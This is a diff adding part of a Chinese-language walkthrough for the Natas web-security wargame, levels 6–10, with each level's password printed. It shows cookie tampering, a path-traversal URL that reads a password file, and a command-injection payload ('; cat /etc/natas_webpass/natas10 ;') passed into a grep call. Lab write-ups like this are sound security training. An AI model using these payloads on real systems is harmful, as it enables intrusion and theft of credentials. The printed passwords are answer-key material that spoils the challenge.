@@ -96,3 +96,57 @@ Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
 密码为 `e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M`
 
 ## Level 6
+打开开发者工具，检查 Cookie，发现 `logged=0`，改为 1，刷新即可。
+
+密码为 `7mhjtShJAcld2NYbKHEadnhEwRn2P8VT`
+
+## Level 7
+查看服务端源代码，发现
+```js
+include "includes/secret.inc";
+```
+继而检查 `includes/secret.inc` 路径，发现
+```plain
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
+提交即可。
+
+密码为 `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`
+
+## Level 8
+直接访问 `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
+```plain
+ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
+```
+
+密码为 `ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc`
+
+## Level 9
+查看源代码发现密码编码逻辑：
+```js
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {  
+    return bin2hex(strrev(base64_encode($secret)));  
+}
+```
+
+用 https://cyberchef.org/ 解码，得到 `oubWYf2kBq`，提交即可。
+
+密码为 `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`
+
+## Level 10
+查看源代码，发现可利用逻辑：
+```js
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+```
+
+构造字符串 `; cat /etc/natas_webpass/natas10 ;` 提交即可。
+
+密码为 `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`
+
+## Level 11
